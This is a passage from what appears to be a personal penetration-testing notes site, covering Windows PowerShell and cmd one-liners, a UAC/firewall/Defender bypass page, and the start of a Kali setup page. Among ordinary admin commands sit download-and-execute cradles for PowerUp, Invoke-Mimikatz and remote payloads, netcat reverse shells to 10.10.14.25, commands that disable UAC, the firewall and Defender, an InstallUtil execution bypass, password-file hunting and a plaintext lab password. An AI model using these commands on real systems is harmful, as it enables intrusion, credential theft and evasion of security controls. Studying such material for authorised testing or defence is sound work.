-Asynchronous\n</code></pre> <pre><code>powershell -exec bypass -c \"(New-Object Net.WebClient).DownloadFile('http://192.168.1.3','C:\\temp\\launcher.bat')\"\n</code></pre>"},{"location":"Windows/Powershell/#download-powerup-with-powershell-v20","title":"Download Powerup With Powershell &lt;= V.2.0","text":"<pre><code>$WebClient = New-Object System.Net.WebClient\n$WebClient.DownloadFile(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1\",\"C:\\Temp\\PowerUp.ps1\")\n\n# one-liner alternative:\n(New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1\",\"C:\\Temp\\PowerUp.ps1\")\n\n\n# another one:\npowershell.exe -ep bypass -e IEX ((new-object net.webclient).downloadstring('http://target.com:8080/robots.txt'))\n</code></pre>"},{"location":"Windows/Powershell/#using-powerup","title":"USING POWERUP","text":"<pre><code>import-module c:\\PowerUp\\powerup.ps1\n# Run all the checks\nInvoke-AllChecks\n</code></pre>"},{"location":"Windows/Powershell/#powerup-one-liner","title":"PowerUp one-liner","text":"<pre><code>#Get PowerUp, run it, and output to a text file so we can read the output easily.\npowershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks &gt; C:\\Temp\\PU.txt\n</code></pre>"},{"location":"Windows/Powershell/#powershell-mimikatz","title":"Powershell MIMIKATZ","text":"<pre><code>powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz\n</code></pre>"},{"location":"Windows/Powershell/#tail-a-logfile","title":"Tail a logfile","text":"<pre><code># You can effectively tail -f the last two lines from a log file with the following:\nGet-Content logfile.log -Tail 2 \u2013Wait\n</code></pre>"},{"location":"Windows/Powershell/#run-powershell-script-to-get-around-execution-of-scripts-disabled-error","title":"Run powershell script to get around execution of scripts disabled error","text":"<pre><code>powershell -ExecutionPolicy Bypass -File &lt;file&gt;.ps1\n</code></pre>"},{"location":"Windows/Powershell/#download-sysinternals","title":"Download SYSINTERNALS","text":"<pre><code># First you need to ignore ssl trust:\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n\n# then you can download it:\n(New-Object System.Net.WebClient).DownloadFile(\"https://download.sysinternals.com/files/SysinternalsSuite.zip\",\"C:\\Temp\\sysinternals.zip\")\n</code></pre>"},{"location":"Windows/Powershell/#get-hostname","title":"Get hostname:","text":"<pre><code>$env:computername\n</code></pre>"},{"location":"Windows/Powershell/#list-local-accounts-on-a-system","title":"List local accounts on a system:","text":"<pre><code>Get-WmiObject -Class Win32_UserAccount -Filter \"LocalAccount='True'\"\n</code></pre>"},{"location":"Windows/Powershell/#check-if-system-is-joined-to-a-domain-or-a-workgroup","title":"Check if system is joined to a domain or a workgroup:","text":"<pre><code>if ((gwmi win32_computersystem).partofdomain -eq $true) { write-host -fore green 'This system is on a domain' } else { write-host -fore red 'This system is part of a workgroup' }\n</code></pre>"},{"location":"Windows/Powershell/#set-environment-variable","title":"SET ENVIRONMENT VARIABLE","text":"<pre><code>$env:&lt;name&gt;=\"stuff\"\n</code></pre>"},{"location":"Windows/Powershell/#show-env-vars-in-running-script","title":"SHOW ENV VARS IN RUNNING SCRIPT","text":"<pre><code>gci env:* | sort-object &lt;name&gt;\nResource: https://stackoverflow.com/questions/39800481/display-all-environment-variables-from-running-powershell-script\n</code></pre>"},{"location":"Windows/Powershell/#get-list-of-running-processes","title":"Get list of running processes:","text":"<pre><code>Get-Process\n\nGet-WmiObject win32_process | Select-Object Name,@{n='Owner';e={$_.GetOwner().User}}\n</code></pre>"},{"location":"Windows/Powershell/#check-if-system-is-running-a-desktop-version-of-windows","title":"CHECK IF SYSTEM IS RUNNING A DESKTOP VERSION OF WINDOWS","text":"<pre><code>$windesktop = (gwmi win32_operatingsystem).OperatingSystemSKU -notmatch \"(\\b[7-9]|10|1[2-5]|1[7-9]|2[0-5])\"\nif ($windesktop)\n{\n    write-output \"OS is a flavor of Windows Desktop\"\n}\n</code></pre>"},{"location":"Windows/Powershell/#get-windows-kernel-version","title":"GET WINDOWS KERNEL VERSION","text":"<pre><code>[Environment]::OSVersion.Version\n</code></pre>"},{"location":"Windows/Powershell/#get-list-of-ipv4-addr","title":"GET LIST OF IPV4 ADDR","text":"<pre><code>(gwmi Win32_NetworkAdapterConfiguration | ? { $_.IPAddress -ne $null }).ipaddress\n</code></pre>"},{"location":"Windows/Powershell/#change-hostname","title":"CHANGE HOSTNAME","text":"<pre><code>Get-WmiObject -Class Win32_ComputerSystem\n$ComputerInfo.Rename(\"new_name\")\n</code></pre>"},{"location":"Windows/Powershell/#log-script-output-to-file","title":"LOG SCRIPT OUTPUT TO FILE","text":"<pre><code>Start-Transcript -path c:\\windows\\temp\\interesting.log -Append -force\n\n# do stuff\n\nstop-transcript\nexit 1001\n</code></pre>"},{"location":"Windows/Powershell/#wget","title":"WGET","text":"<pre><code>wget http://&lt;evil server&gt;/evil.exe -Outfile evil.exe\n</code></pre>"},{"location":"Windows/Powershell/#check-permissions-for-folder","title":"Check Permissions For Folder","text":"<pre><code>icacls &lt;path&gt;\n</code></pre>"},{"location":"Windows/Powershell/#netstat-with-find","title":"NETSTAT WITH FIND","text":"<pre><code># This is an example of what I equate to running netstat and piping the results through grep in linux. In powershell however, you need to escape the double ticks or it will throw an error:\n\nnetstat -anob  | find `\"443`\"\n</code></pre>"},{"location":"Windows/Powershell/#look-for-files-with-passwords","title":"Look for files with passwords:","text":"<pre><code>dir /b /s web.config\ndir /b /s unattend.xml\ndir /b /s sysprep.inf\ndir /b /s sysprep.xml\ndir /b /s *pass*\n</code></pre>"},{"location":"Windows/Powershell/#disable-firewall","title":"Disable firewall","text":"<pre><code>netsh advfirewall set allprofiles state off\n</code></pre>"},{"location":"Windows/Powershell/#make-administrator-user-active","title":"Make administrator user active","text":"<pre><code>net user administrator /active:yes\n</code></pre>"},{"location":"Windows/Powershell/#set-user-password-to-never-expire","title":"Set user password to never expire","text":"<pre><code>net user user /expires:never /active:yes /logonpasswordchg:no\n</code></pre>"},{"location":"Windows/Powershell/#netstat-show-listening-ports","title":"Netstat (show listening ports):","text":"<pre><code>cmd /c \"netstat -a\"\n</code></pre>"},{"location":"Windows/Powershell/#cmd","title":"CMD","text":""},{"location":"Windows/Powershell/#useful-cmd-one-liners","title":"Useful cmd one-liners:","text":"<p>Open event viewer from cmd:</p> <pre><code>eventvwr\n</code></pre> <p>View the status of a service:</p> <pre><code>sc query &lt;service name&gt;\n</code></pre> <p>Stop service:</p> <pre><code>sc stop &lt;service name&gt;\n</code></pre> <p>Start service:</p> <pre><code>sc start &lt;servicename&gt;\n</code></pre> <p>Open services msc:</p> <pre><code>services.msc\n</code></pre> <p>Lists all the service information for each process:</p> <pre><code>tasklist /svc\n</code></pre> <p>Kill a process by PID:</p> <pre><code>taskkill /pid &lt;pid&gt; /f\n</code></pre> <p>Kill firefox (or any process) by name:</p> <pre><code>taskkill /im firefox.exe /f\n</code></pre> <p>Delete a file:</p> <pre><code>del &lt;file name&gt;\n</code></pre> <p>List drives:</p> <pre><code>fsutil fsinfo drives\n</code></pre> <p>Show users with active sessions:</p> <pre><code>quser or query user\n</code></pre> <p>Show active network sessions:</p> <pre><code>netstat -vb\n</code></pre> <p>Get last modified file in a directory (conceptually similar to ls -lart):</p> <pre><code>dir /O:D /T:W /A:-D\n</code></pre> <p>Rename file:</p> <pre><code>move file new-file-name\n</code></pre> <p>Show contents of file:</p> <pre><code>type file.txt\n</code></pre> <p>Current current user and privilege info</p> <pre><code>whoami /all\n</code></pre> <p>List users</p> <pre><code>net users\n</code></pre> <p>List domain users and output to a file</p> <pre><code>net user /domain &gt; domain-user-list.txt\n</code></pre> <p>List domain controller the current system is authenticated with</p> <pre><code>echo %LOGONSERVER%\n</code></pre> <p>Get FSMO roles for current domain (useful info about domain controller setup)</p> <pre><code>NETDOM QUERY /D:targetdomain.com FSMO\n</code></pre> <p>List all domain controllers in the current domain</p> <pre><code>net group \"Domain Controllers\" /domain\n</code></pre> <p>Print password policy</p> <pre><code>net accounts\n</code></pre> <p>Reboot system</p> <pre><code>shutdown -r\n</code></pre> <p>Query the registry</p> <pre><code>reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n</code></pre> <p>Remove a key from the registry</p> <pre><code>reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v hFaZvOAsF /f\n</code></pre> <p>Show environment variables</p> <pre><code>set\n</code></pre>"},{"location":"Windows/UAC_Firewall_Defender_bypass/","title":"UAC Firewall Defender bypass","text":"<pre><code>reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f\nNetSh Advfirewall set allprofiles state off\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\ncd\\; cscript windows\\system32\\scregedit.wsf /ar 0\n\n\npowershell -c \"Set-MpPreference -DisableRealtimeMonitoring $true\"\n</code></pre>"},{"location":"Windows/powershell_to_sort/","title":"Powershell to sort","text":"<p>Multiple and/or conditions:</p> <pre><code>Invoke-Command -computername SERVERNAME { Get-ChildItem -path E:\\dfsroots\\datastore2\\public} | Where-Object {{ $_.extension-match \"xls\" -or $_.extension-match \"xlk\" } -and  { $_.creationtime -ge \"06/01/2014\"}}\n</code></pre> <p>Custom Property (named calculation)</p> <pre><code>@{Name = 'Name'; Expression = {$_.Name}}\nGet-Service | Select-Object -Property @{Name = 'Name'; Expression = {$_.Name}}\n</code></pre> <p>file name from path:</p> <pre><code>$outputPath = \"D:\\Server\\User\\CUST\\MEA\\Data\\In\\Files\\CORRECTED\\CUST_MEAFile.csv\"\n$outputFile = Split-Path $outputPath -leaf\n</code></pre> Command Description Example Get-Acl Gets the security descriptor for a resource, such as a file or registry key. Get-NetTCPConnection Gets TCP connections. Get-SmbShare Retrieves the SMB shares on the computer. Get-Unique Measure-Object Calculates the numeric properties of objects, and the characters, words, and lines in string objects, such as files of text. <code>get-alias \\| measure \\| % { $_.Count }</code> Sort-Object Where-Object Selects objects from a collection based on their property values."},{"location":"Windows/powershell_to_sort/#see-listening-tcp-ports","title":"See listening TCP Ports:","text":"<pre><code>Get-NetTCPConnection\nGet-NetTCPConnection - State established\n## see properties:\nGet-NetTCPConnection | Get-Member -MemberType property | Format-Table name, definition -AutoSize\n</code></pre>"},{"location":"Windows/powershell_to_sort/#running-commands-as-another-user","title":"Running commands as another user:","text":"<pre><code>$username = \"username\"\n$password = \"password\"\n$securePassword = ConvertTo-SecureString $password -AsPlainText -Force\n$credential = New-Object System.Management.Automation.PSCredential($username, $securePassword)\n$Session = New-PSSession -Credential $credential\nicm -Session $Session -ScriptBlock { COMMAND_TO_RUN }\n\n\n$username = \"username\"\n$password = \"password\"\n$securePassword = ConvertTo-SecureString $password -AsPlainText -Force\n$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword\nInvoke-Command -Credential $credential -ComputerName COMPUTERNAME -ScriptBlock { COMMAND_TO_RUN }\n</code></pre>"},{"location":"Windows/powershell_to_sort/#run-command-in-background","title":"Run command in background:","text":"<pre><code>Start-Process -NoNewWindow command_to_run\n\n# alternatively, create a function\nfunction bg() {Start-Process -NoNewWindow @args}\n</code></pre>"},{"location":"Windows/powershell_to_sort/#check-powershell-version","title":"Check Powershell version:","text":"<pre><code>Get-Host | Select-Object Version\n</code></pre>"},{"location":"Windows/powershell_to_sort/#powershell-for-pen-tester-post-exploitation","title":"PowerShell for Pen-Tester Post-Exploitation","text":"<p>Conduct a ping sweep:</p> <pre><code>PS C:\\&gt; 1..255 | % {echo \"10.10.10.$_\"; ping -n 1 -w 100 10.10.10.$_ | Select-String ttl}\n</code></pre> <p>Conduct a port scan:</p> <pre><code>PS C:\\&gt; 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect(\"10.10.10.10\",$_)) \"Port $_ is open!\"} 2&gt;$null\n</code></pre> <p>Fetch a file via HTTP (wget in PowerShell):</p> <pre><code>PS C:\\&gt; (New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/nc.exe\",\"nc.exe\")\n</code></pre> <p>Find all files with a particular name:</p> <pre><code>PS C:\\&gt; Get-ChildItem \"C:\\Users\\\" -recurse -include *passwords*.txt\n</code></pre> <p>Get a listing of all installed Microsoft Hotfixes:</p> <pre><code>PS C:\\&gt; Get-HotFix\n</code></pre> <p>Navigate the Windows registry:</p> <pre><code>PS C:\\&gt; cd HKLM:\\\nPS HKLM:\\&gt; ls\n</code></pre> <p>List programs set to start automatically in the registry:</p> <pre><code>PS C:\\&gt; Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run\n</code></pre> <p>Convert string from ascii to Base64:</p> <pre><code>PS C:\\&gt; [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(\"PS FTW!\"))\n</code></pre> <p>List and modify the Windows firewall rules:</p> <pre><code>PS C:\\&gt; Get-NetFirewallRule -all\nPS C:\\&gt; New-NetFirewallRule -Action Allow -DisplayName LetMeIn -RemoteAddress 10.10.10.25\n</code></pre>"},{"location":"Windows/powershell_to_sort/#cmdlets","title":"Cmdlets","text":"<p>Cmdlets are small scripts that follow a dash-separated verb-noun convention such as \"Get-Process\".</p> <p>Similar Verbs with Different Actions: - New- Creates a new resource -\u202fSet- Modifies an existing resource -\u202fGet- Retrieves an existing resource -\u202fRead- Gets information from a source, such as a file -\u202fFind- Used to look for an object -\u202fSearch- Used to create a reference to a resource -\u202fStart- (asynchronous) begin an operation, such as starting a process -\u202fInvoke- (synchronous) perform an operation such as running a command</p> <p>Parameters: Each verb-noun named cmdlet may have many parameters to control cmdlet functionality.</p> <p>Objects: The output of most cmdlets are objects that can be passed to other cmdlets and further acted upon. This becomes important in pipelining cmdlets.</p>"},{"location":"Windows/powershell_to_sort/#finding-cmdlets","title":"Finding Cmdlets","text":"<p>To get a list of all available cmdlets:</p> <pre><code>PS C:\\&gt; Get-Command\n</code></pre> <p>Get-Command supports filtering. To filter cmdlets on the verb set:</p> <pre><code>PS C:\\&gt; Get-Command Set*\nPS C:\\&gt; Get-Command -Verb Set\n</code></pre> <p>Or on the noun process:</p> <pre><code>PS C:\\&gt; Get-Command *Process\nPS C:\\&gt; Get-Command -Noun process\n</code></pre>"},{"location":"Windows/powershell_to_sort/#getting-help","title":"Getting Help","text":"<p>To get help with help:</p> <pre><code>PS C:\\&gt; Get-Help\n</code></pre> <p>To read cmdlet self documentation:</p> <pre><code>PS C:\\&gt; Get-Help &lt;cmdlet&gt;\n</code></pre> <p>Detailed help:</p> <pre><code>PS C:\\&gt; Get-Help &lt;cmdlet&gt; -detailed\n</code></pre> <p>Usage examples:</p> <pre><code>PS C:\\&gt; Get-Help &lt;cmdlet&gt; -examples\n</code></pre> <p>Full (everything) help:</p> <pre><code>PS C:\\&gt; Get-Help &lt;cmdlet&gt; -full\n</code></pre> <p>Online help (if available):</p> <pre><code>PS C:\\&gt; Get-Help &lt;cmdlet&gt; -online\n</code></pre>"},{"location":"Windows/powershell_to_sort/#cmdlet-aliases","title":"Cmdlet Aliases","text":"<p>Aliases provide short references to long commands.</p> <p>To list available aliases (alias alias):</p> <pre><code>PS C:\\&gt; Get-Alias\n</code></pre> <p>To expand an alias into a full name:</p> <pre><code>PS C:\\&gt; alias &lt;unknown alias&gt;\nPS C:\\&gt; alias gcm\n</code></pre>"},{"location":"Windows/powershell_to_sort/#efficient-powershell","title":"Efficient PowerShell","text":"<p>Parameter shortening:</p> <pre><code>PS C:\\&gt; ls -recurse is equivalent to:\nPS C:\\&gt; ls -r\n</code></pre>"},{"location":"Windows/powershell_to_sort/#5-powershell-essentials","title":"5 PowerShell Essentials","text":"Concept What\u2019s it Do? A Handy Alias <code>PS C:\\&gt; Get-Help [cmdlet] -examples</code> Shows help &amp; examples <code>PS C:\\&gt; help [cmdlet] -examples</code> <code>PS C:\\&gt; Get-Command</code> Shows a list of commands <code>PS C:\\&gt; gcm *[string]*</code> <code>PS C:\\&gt; Get-Member</code> Shows properties &amp; methods <code>PS C:\\&gt; [cmdlet] \\| gm</code> <code>PS C:\\&gt; ForEach-Object { $_ }</code> Takes each item on pipeline and handles it as $_ <code>PS C:\\&gt; [cmdlet] \\| % { [cmdlet] $_ }</code> <code>PS C:\\&gt; Select-String</code> Searches for strings in files or output, like grep <code>PS C:\\&gt; sls -path [file] -pattern [string]</code>"},{"location":"Windows/powershell_to_sort/#pipelining-loops-and-variables","title":"Pipelining, Loops, and Variables","text":"<p>Piping cmdlet output to another cmdlet:</p> <pre><code>PS C:\\&gt; Get-Process | Format-List -property name\n</code></pre> <p>ForEach-Object in the pipeline (alias %):</p> <pre><code>PS C:\\&gt; ls *.txt | ForEach-Object {cat $_}\n</code></pre> <p>Where-Object condition (alias where or ?):</p> <pre><code>PS C:\\&gt; Get-Process | Where-Object {$_.name -eq \"notepad\"}\n</code></pre> <p>Generating ranges of numbers and looping:</p> <pre><code>PS C:\\&gt; 1..10\nPS C:\\&gt; 1..10 | % {echo \"Hello!\"}\n</code></pre> <p>Creating and listing variables:</p> <pre><code>PS C:\\&gt; $tmol = 42\nPS C:\\&gt; ls variable:\n</code></pre> <p>Examples of passing cmdlet output down pipeline:</p> <pre><code>PS C:\\&gt; dir | group extension | sort\nPS C:\\&gt; Get-Service dhcp | Stop-Service -PassThru | Set-Service -StartupType Disabled\n</code></pre> <p>https://docs.microsoft.com/en-us/powershell/scripting/samples/using-format-commands-to-change-output-view?view=powershell-6</p> <pre><code>Get-Process -Name powershell | Format-List -Property *\nGet-Process -Name powershell | Format-List -Property ProcessName,FileVersion\n\n\nGet-Command -Verb Format | Format-Wide\nGet-Command -Verb Format | Format-Wide -Property Noun -Column 1\n</code></pre> <p>https://www.thomasmaurer.ch/2011/03/powershell-search-for-string-or-grep-for-powershell/</p> <p>\"Grep\" in Powershell</p> <pre><code>| findstr -i &lt;searchterm&gt;\n</code></pre> <p>http://woshub.com/port-forwarding-in-windows/ Windows port fwd:</p> <pre><code>netsh interface portproxy add v4tov4 listenport=4422 listenaddress=192.168.1.111 connectport=80 connectaddress=192.168.0.33\n</code></pre> <p>To remove forwarding:</p> <pre><code>netsh interface portproxy delete v4tov4 listenport=4422 listenaddress=192.168.1.111\n</code></pre> <pre><code>netsh advfirewall firewall add rule name=\u201dforwarded_RDPport_3340\u201d protocol=TCP dir=in localip=10.1.1.110  localport=3340 action=allow\n</code></pre>"},{"location":"Windows/powershell_to_sort/#powershell-cmd","title":"Powershell &amp; cmd","text":"<p>Find running processes and their port number http://blogs.microsoft.co.il/scriptfanatic/2011/02/10/how-to-find-running-processes-and-their-port-number/</p> <pre><code>function Get-NetworkStatistics\n{\n    $properties = 'Protocol','LocalAddress','LocalPort'\n    $properties += 'RemoteAddress','RemotePort','State','ProcessName','PID'\n\n    netstat -ano | Select-String -Pattern '\\s+(TCP|UDP)' | ForEach-Object {\n\n        $item = $_.line.split(\u201d \u201c,[System.StringSplitOptions]::RemoveEmptyEntries)\n\n        if($item[1] -notmatch '^\\[::')\n        {\n            if (($la = $item[1] -as [ipaddress]).AddressFamily -eq 'InterNetworkV6')\n            {\n               $localAddress = $la.IPAddressToString\n               $localPort = $item[1].split('\\]:')[-1]\n            }\n            else\n            {\n                $localAddress = $item[1].split(':')[0]\n                $localPort = $item[1].split(':')[-1]\n            }\n\n            if (($ra = $item[2] -as [ipaddress]).AddressFamily -eq 'InterNetworkV6')\n            {\n               $remoteAddress = $ra.IPAddressToString\n               $remotePort = $item[2].split('\\]:')[-1]\n            }\n            else\n            {\n               $remoteAddress = $item[2].split(':')[0]\n               $remotePort = $item[2].split(':')[-1]\n            }\n\n            New-Object PSObject -Property @{\n                PID = $item[-1]\n                ProcessName = (Get-Process -Id $item[-1] -ErrorAction SilentlyContinue).Name\n                Protocol = $item[0]\n                LocalAddress = $localAddress\n                LocalPort = $localPort\n                RemoteAddress =$remoteAddress\n                RemotePort = $remotePort\n                State = if($item[0] -eq 'tcp') {$item[3]} else {$null}\n            } | Select-Object -Property $properties\n        }\n    }\n}\n\nGet-NetworkStatistics | Format-Table\n</code></pre> <p>To get all processes running on a local port 80:</p> <pre><code>Get-NetworkStatistics | Where-Object {$_.LocalPort -eq 80} | Format-Table\n</code></pre> <p>Or find a connection information by filtering on ProcessName:</p> <pre><code>Get-NetworkStatistics | Where-Object {$_.ProcessName -eq 'proc_name'} | Format-Table\n</code></pre> <p>Download file using certutil</p> <pre><code>certutil.exe -urlcache -split -f http://URL/PowerUp.ps1 C:\\Users\\Public\\Documents\\PowerUp.ps1\n</code></pre> <p>Copy folder structure recursively</p> <pre><code>robocopy \"PATH\\TO\\COPY\\FROM\" \"PATH\\TO\\COPY\\TO\" /e /xf *.*\n</code></pre> <p>To copy everything in a folder hierarchy</p> <pre><code>Copy-Item $source $dest -Recurse -Force\n</code></pre> <p>To copy the hierarchy you can try:</p> <pre><code>$source = \"C:\\ProdData\"\n$dest = \"C:\\TestData\"\nCopy-Item $source $dest -Filter {PSIsContainer} -Recurse -Force\n</code></pre> <p>To flatten a file structure you can try:</p> <pre><code>$source = \"C:\\ProdData\"\n$dest = \"C:\\TestData\"\nNew-Item $dest -type directory\nGet-ChildItem $source -Recurse | `\n    Where-Object { $_.PSIsContainer -eq $False } | `\n    ForEach-Object {Copy-Item -Path $_.Fullname -Destination $dest -Force}\n</code></pre> <p>Get Short Path:</p> <pre><code>cmd /c for %A in (\"file/path\") do @echo %~sA\n\n# alternatively\ndir /x\n</code></pre> <p>PowerShell - zip files:</p> <pre><code>Compress-Archive -Path ./filename, ./filename2 -CompressionLevel Optimal -DestinationPath ./output.zip\n</code></pre> <pre><code>Runas /env /user:SS64Dom\\jDoe\nRunas /user:helpline\\leo \"./nc.exe -vn 10.10.14.25 9002 -e cmd.exe\"\n</code></pre> <pre><code>iwr -Uri http://10.10.14.25/RunAs.exe -OutFile C:\\windows\\system32\\spool\\drivers\\color\\RunAs.exe\nC:\\windows\\system32\\spool\\drivers\\color\\RunAs helpline\\leo 123 C:\\windows\\system32\\spool\\drivers\\color\\nc.exe -vn 10.10.14.25 9002 -e cmd.exe\n</code></pre> <p>icacls user.txt /reset</p> <p>New-Object -TypeName PSCredential</p> <p>$pass = Get-Content \"C:\\Users\\leo\\Desktop\\admin-pass.xml\" | ConvertTo-SecureString</p> <pre><code>$username = 'user'\n$password = 'password'\n$securePassword = ConvertTo-SecureString $password -AsPlainText -Force\n</code></pre> <pre><code>$username = \"Administrator\"\n$pass = Get-Content \"C:\\Users\\leo\\Desktop\\admin-pass.xml\" | ConvertTo-SecureString\n$credential = New-Object System.Management.Automation.PSCredential $username, $pass\n$Session = New-PSSession -Credential $credential\nicm -Session $Session -ScriptBlock { C:\\windows\\system32\\spool\\drivers\\color\\nc.exe -vn 10.10.14.25 9001 -e cmd.exe}\n</code></pre> <pre><code>$username = \"Administrator\"\n$pass = Get-Content \"C:\\Users\\leo\\Desktop\\admin-pass.xml\" | ConvertTo-SecureString\n$credential = New-Object System.Management.Automation.PSCredential $username, $pass\n$credential.GetNetworkCredential() | fl *\n</code></pre> <pre><code>$username = \"batman\"\n$password = \"Zx^#QZX+T!123\"\n$securePassword = ConvertTo-SecureString $password -AsPlainText -Force\n$credential = New-Object System.Management.Automation.PSCredential($username, $securePassword)\nPS C:\\Users\\Alfred\\AppData\\Local\\Temp&gt; $Session = New-PSSession -Credential $credential\n$Session = New-PSSession -Credential $credential\nPS C:\\Users\\Alfred\\AppData\\Local\\Temp&gt; icm -Session $Session -ScriptBlock { iwr http://10.10.14.25/nc.exe -OutFile C:\\Users\\Batman\\Desktop\\nc.exe; C:\\Users\\Batman\\Desktop\\nc.exe -vn 10.10.14.25 9002 -e cmd.exe}\nicm -Session $Session -ScriptBlock { iwr http://10.10.14.25/nc.exe -OutFile C:\\Users\\Batman\\Desktop\\nc.exe; C:\\Users\\Batman\\Desktop\\nc.exe -vn 10.10.14.25 9002 -e cmd.exe}\n</code></pre> <p>icm -Session $Session -ScriptBlock { C:\\windows\\system32\\spool\\drivers\\color\\nc.exe -vn 10.10.14.25 9001 -e cmd.exe}</p> <pre><code>iwr http://10.10.14.25/psby.exe -OutFile C:\\Users\\alice\\AppData\\Local\\Temp\\psby.exe\n\n\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=true /U C:\\Users\\alice\\AppData\\Local\\Temp\\psby.exe\n\nPS helpline\\alice@HELPLINE Temp&gt; copy -Path \"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe\" -Destination \"C:\\Users\\alice\\AppData\\Local\\Temp\\a.exe\"\n\nC:\\Users\\alice\\AppData\\Local\\Temp\\a.exe /logfile= /LogToConsole=true /U C:\\Users\\alice\\AppData\\Local\\Temp\\psby.exe\n</code></pre> <pre><code>cmd /c powershell.exe -exec bypass -c \"iwr http://10.10.14.25/nc.exe -OutFile ./nc.exe; ./nc.exe -vn 10.10.14.25 9002 -e cmd.exe\"\n\npowershell IEX (Invoke-WebRequest -Uri \"http://10.10.14.25/nc.exe\" -outfile \"C:\\windows\\system32\\spool\\drivers\\color\\nc.exe\")\npowershell IEX (C:\\windows\\system32\\spool\\drivers\\color\\nc.exe -vn 10.10.14.25 9002 -e cmd.exe)\n</code></pre> <pre><code>reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f\nNetSh Advfirewall set allprofiles state off\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\ncd\\; cscript windows\\system32\\scregedit.wsf /ar 0\n\nSet-MpPreference -DisableRealtimeMonitoring $true\n</code></pre> <pre><code>cipher /U /N\n</code></pre> <pre><code>Invoke-WebRequest -Uri http://10.10.14.25/prometheus.exe -OutFile C:\\Users\\Batman\\AppData\\Local\\Temp\\prometheus.exe\n\n\nInvoke-WebRequest -Uri http://10.10.14.25/psby.exe -OutFile C:\\Users\\Batman\\AppData\\Local\\Temp\\psby.exe\n\n\npowershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.25/payload.ps1');\n\niwr -Uri http://10.10.14.25/payload.exe -OutFile \"C:\\windows\\system32\\spool\\drivers\\color\\payload.exe\"\niwr('http://10.10.14.25/payload.exe')|iex\n\n\npowershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.25/powershell_attack.txt');\n\niwr -Uri http://10.10.14.25/mimikatz.exe -OutFile \"C:\\windows\\system32\\spool\\drivers\\color\\mimikatz.exe\"\n</code></pre> <p>wmic service get name,displayname,pathname,startmode |findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\" |findstr /i /v \"\"\"</p> <p>icacls</p> <p>largebackup.ps1</p> <pre><code>$path = \"C:\\Program Files\\Microsoft SQL Server\\MSSQL12.SQLEXPRESS\\MSSQL\\backup\"\n$size = 10MB\n$limit = 5\n$Extension = \"*.bak\"\n$largeSizefiles = get-ChildItem -path $path -recurse -ErrorAction \"SilentlyContinue\" -include $Extension | ? { $_.GetType().Name -eq \"FileInfo\" } | where-Object {$_.Length -gt $size} | sort-Object -property length -Descending | Select-Object Name, @{Name=\"SizeInMB\";Expression={$_.Length / 1MB}},@{Name=\"Path\";Expression={$_.directory}} -first $limit\n$largeSizefiles\n</code></pre> <pre><code>c:\\windows\\system32\\windowspowershell\\v1.0\\powershell -f sherlock.ps1\n$r=new-object system.net.webclient;$r.downloadfile('http://192.168.1.128/zz.txt','zz.yzy')\n</code></pre> <pre><code>$u = 'DOMAIN\\USER'\n$p = convertto-securestring 'PASSWORD' -asplain -force\n$c = new-object system.management.automation.pscredential($u, $p)\nstart-process 'Powershell.exe' -Credential $c -ArgumentList 'ARGS'\n</code></pre> <p>https://superuser.com/questions/1259900/how-to-colorize-the-powershell-prompt https://docs.microsoft.com/en-us/windows/console/console-virtual-terminal-sequences</p> <pre><code>function prompt  \n{  \n    \"PS $($executionContext.SessionState.Path.CurrentLocation)$('&gt;' * ($nestedPromptLevel + 1)) \"  \n}\n</code></pre> <pre><code>function prompt  \n{  \n    $ESC = [char]27\n    \"$ESC[96mPS $($executionContext.SessionState.Path.CurrentLocation)$('&gt;' * ($nestedPromptLevel + 1)) $ESC[0m\"  \n}\n</code></pre> <p>function Set-ConsoleColor ($bc, $fc) {     $Host.UI.RawUI.BackgroundColor = $bc     $Host.UI.RawUI.ForegroundColor = $fc     Clear-Host } Set-ConsoleColor 'black' 'black'</p>"},{"location":"kali_setup_and_installs/","title":"Kali setup and installs","text":""},{"location":"kali_setup_and_installs/#initial-setup","title":"Initial setup","text":"<pre><code>sudo apt-get clean &amp;&amp; sudo apt-get update &amp;&amp; sudo apt-get upgrade -y &amp;&amp; sudo apt-get dist-upgrade -y\n\nsudo reboot\n</code></pre>"},{"location":"kali_setup_and_installs/#add-additional-user","title":"Add additional user:","text":"<pre><code>sudo useradd -m glasgow\nsudo passwd glasgow\nsudo usermod -a -G sudo,vboxsf,docker glasgow\n# sudo usermod -a -G docker glasgow\n# sudo usermod -a -G sudo glasgow\n# sudo usermod -a -G vboxsf glasgow\nsudo chsh -s 